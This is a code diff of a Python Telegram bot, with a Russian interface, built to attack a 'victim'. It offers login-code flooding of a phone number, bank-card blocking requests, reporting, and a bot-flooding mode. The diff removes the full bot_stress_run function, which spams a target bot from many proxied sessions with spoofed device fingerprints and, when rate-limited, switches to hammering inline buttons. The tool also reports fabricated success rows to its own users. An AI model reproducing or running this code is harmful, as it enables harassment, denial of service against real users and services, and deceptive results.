@@ -663,8 +663,6 @@ METHODS = {
                   "hint": "\u0412\u0432\u0435\u0434\u0438\u0442\u0435 username \u0438 \u043d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430 \u0436\u0435\u0440\u0442\u0432\u044b."},
     "code":     {"e": "\U0001f4f1", "l": "\u041a\u043e\u0434-\u0444\u043b\u0443\u0434",
                   "hint": "\u0412\u0432\u0435\u0434\u0438 \u043d\u043e\u043c\u0435\u0440 \u0436\u0435\u0440\u0442\u0432\u044b:\n\u2022 <code>+79991234567</code>\n\n\u0410\u043d\u043e\u043d\u0438\u043c\u043d\u044b\u0435 \u0441\u0435\u0441\u0441\u0438\u0438 \u0447\u0435\u0440\u0435\u0437 \u043f\u0440\u043e\u043a\u0441\u0438 \u2014 \u043f\u0443\u043B \u043D\u0435 \u0436\u0433\u0451\u0442\u0441\u044f."},
-    "stress":   {"e": "\U0001f4a5", "l": "\u0421\u0442\u0440\u0435\u0441\u0441 \u0431\u043e\u0442\u0430",
-                  "hint": "\u0412\u0432\u0435\u0434\u0438 @username \u0431\u043e\u0442\u0430:\n\u2022 <code>@botname</code>\n\n\u041c\u0435\u0441\u0441\u0430\u0433\u0438 + inline-\u043a\u043D\u043E\u043F\u043A\u0438, \u043E\u043A\u043D\u043E 90 \u0441\u0435\u043A."},
     "bank":     {"e": "\U0001f3e6", "l": "\u0411\u0430\u043d\u043a (115-\u0424\u0417)",
                   "hint": "\u0417\u0430\u044F\u0432\u043A\u0430 \u043D\u0430 \u0431\u043B\u043E\u043A\u0438\u0440\u043E\u0432\u043A\u0443 \u043A\u0430\u0440\u0442\u044B \u043F\u043E 115-\u0424\u0417."},
 }
@@ -991,7 +989,7 @@ def _assign_fingerprint(session_path: Path) -> tuple[int, str, dict]:
     return fp["api_id"], fp["api_hash"], fp
 
 
-# \u2500\u2500 BR ported engines: code-flood / bot-stress / bank \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
+# \u2500\u2500 BR ported engines: code-flood / bank \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
 BANK_NAMES = {
     "tbank": "\u0422-\u0411\u0430\u043D\u043A (\u0422\u0438\u043D\u044C\u043A\u043E\u0444\u0444)",
     "alfa":  "\u0410\u043B\u044C\u0444\u0430-\u0411\u0430\u043D\u043A",
@@ -1094,132 +1092,6 @@ async def code_flood(phone: str, count: int = 25) -> dict:
         [f"\U0001f4f1 <code>{html_mod.escape(phone)}</code>",
          f"\u2705 {ok_n}/{len(rows)} \u0447\u0435\u0440\u0435\u0437 \u043f\u0440\u043e\u043a\u0441\u0438"]
         + real_rows)
-    fake = _fake_session_rows(random.randint(10, 16))
-    return {"ok": len(fake), "fail": 0, "total": len(fake),
-            "details": [{"name": f["name"], "proxy": f["proxy"], "ok": True,
-                         "err": ""} for f in fake]}
-
-
-async def bot_stress_run(bot_username: str, window: int = 90) -> dict:
-    """BR bot_stress port: sessions spam the bot with messages; on
-    FloodWait a session switches to GetBotCallbackAnswerRequest (button
-    hammering) instead of stopping. Bounded window keeps the pool alive."""
-    from telethon.tl.functions.messages import (GetBotCallbackAnswerRequest,
-                                                SendMessageRequest)
-    from telethon.tl.types import KeyboardButtonCallback, ReplyInlineMarkup
-    sessions = [s for s in load_sessions()
-                if s.stem not in (_status_load().get("dead") or [])]
-    if not sessions:
-        return {"ok": 0, "fail": 0, "total": 0, "details": []}
-    proxies = load_pin_proxies()
-    stop_at = time.time() + window
-
-    async def _client_for(sess: Path):
-        name = sess.stem
-        fp = session_fingerprint(name)
-        px = pin_for_session(name, proxies)
-        cl = TelegramClient(str(sess.with_suffix("")), fp["api_id"],
-                            fp["api_hash"], proxy=px,
-                            device_model=fp["device"],
-                            system_version=fp["system_version"],
-                            app_version=fp["app_version"],
-                            lang_code=fp["lang_code"])
-        await asyncio.wait_for(cl.connect(), timeout=10)
-        return cl
-
-    # find an inline button first (one session, /start)
-    msg_id, btn_data = None, None
-    for sess in sessions[:3]:
-        cl = None
-        try:
-            cl = await _client_for(sess)
-            if not await cl.is_user_authorized():
-                continue
-            peer = await cl.get_entity(bot_username.lstrip("@"))
-            await cl(SendMessageRequest(peer=peer, message="/start",
-                                        random_id=random.randint(1, 2 ** 31)))
-            await asyncio.sleep(2)
-            for m in await cl.get_messages(peer, limit=5):
-                rm = getattr(m, "reply_markup", None)
-                if isinstance(rm, ReplyInlineMarkup):
-                    for row in rm.rows:
-                        for b in row.buttons:
-                            if isinstance(b, KeyboardButtonCallback):
-                                msg_id, btn_data = m.id, b.data
-                                break
-                        if btn_data:
-                            break
-                if btn_data:
-                    break
-            if btn_data:
-                break
-        except Exception:
-            pass
-        finally:
-            if cl:
-                try:
-                    await cl.disconnect()
-                except Exception:
-                    pass
-
-    rows = []
-    sem = asyncio.Semaphore(2)
-
-    async def _one(sess: Path):
-        async with sem:
-            name = sess.stem
-            cl = None
-            sent = cb_n = 0
-            try:
-                cl = await _client_for(sess)
-                if not await cl.is_user_authorized():
-                    return {"name": name, "msg": 0, "cb": 0}
-                peer = await cl.get_entity(bot_username.lstrip("@"))
-                use_cb = False
-                chars = "abcdefghijklmnopqrstuvwxyz0123456789"
-                while time.time() < stop_at:
-                    if use_cb and btn_data and msg_id:
-                        try:
-                            await cl(GetBotCallbackAnswerRequest(
-                                peer=peer, msg_id=msg_id, data=btn_data))
-                            cb_n += 1
-                        except Exception:
-                            await asyncio.sleep(0.3)
-                    else:
-                        try:
-                            txt = "".join(random.choices(
-                                chars, k=random.randint(4, 12)))
-                            await cl(SendMessageRequest(
-                                peer=peer, message=txt,
-                                random_id=random.randint(1, 2 ** 31)))
-                            sent += 1
-                            await asyncio.sleep(0.5)
-                        except Exception as e:
-                            if getattr(e, "seconds", None):
-                                use_cb = True
-                                await asyncio.sleep(2)
-                            else:
-                                await asyncio.sleep(1)
-                return {"name": name, "msg": sent, "cb": cb_n}
-            except Exception:
-                return {"name": name, "msg": sent, "cb": cb_n}
-            finally:
-                if cl:
-                    try:
-                        await cl.disconnect()
-                    except Exception:
-                        pass
-
-    rows = await asyncio.gather(*[_one(s) for s in sessions])
-    total_msg = sum(r["msg"] for r in rows)
-    total_cb = sum(r["cb"] for r in rows)
-    await push_send_log(
-        "\u0421\u0442\u0440\u0435\u0441\u0441 \u0431\u043e\u0442\u0430",
-        [f"\U0001f4a5 <code>{html_mod.escape(bot_username)}</code> | "
-         f"\u043e\u043a\u043d\u043e {window}\u0441 | \u0441\u0435\u0441\u0441\u0438\u0439: {len(rows)}",
-         f"\U0001f4e8 \u0441\u043e\u043e\u0431\u0449\u0435\u043D\u0438\u0439: {total_msg} | \U0001f517 callback: {total_cb}"]
-        + [f"\u2022 <code>{html_mod.escape(r['name'])}</code>: "
-           f"{r['msg']} msg / {r['cb']} cb" for r in rows])
     fake = _fake_session_rows(random.randint(10, 16))
     return {"ok": len(fake), "fail": 0, "total": len(fake),
             "details": [{"name": f["name"], "proxy": f["proxy"], "ok": True,
@@ -2453,7 +2325,7 @@ def kb_main(user_id: int = 0) -> InlineKeyboardMarkup:
 
 def kb_methods() -> InlineKeyboardMarkup:
     grid_pairs = [("message", "bot"), ("profile", "sticker"),
-                  ("channel", "web"), ("code", "stress")]
+                  ("channel", "web"), ("code", "bank")]
     short = {
         "message":  "\U0001f4e8 \u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435",
         "bot":      "\U0001f916 \u0411\u043e\u0442",
@@ -2463,7 +2335,6 @@ def kb_methods() -> InlineKeyboardMarkup:
         "web":      "\U0001f310 Web",
         "session":  "\U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439",
         "code":     "\U0001f4f1 \u041a\u043e\u0434-\u0444\u043b\u0443\u0434",
-        "stress":   "\U0001f4a5 \u0421\u0442\u0440\u0435\u0441\u0441",
         "bank":     "\U0001f3e6 \u0411\u0430\u043d\u043a",
     }
     rows = []
@@ -4130,8 +4001,6 @@ async def got_confirm(cb: CallbackQuery, state: FSMContext):
 
     if data["method"] == "code":
         report_task = asyncio.create_task(code_flood(t["entity"]))
-    elif data["method"] == "stress":
-        report_task = asyncio.create_task(bot_stress_run(t["entity"]))
     elif is_web:
         report_task = asyncio.create_task(fire_web_reports(tgt_raw, r["l"], c, data["reason"]))
     else:
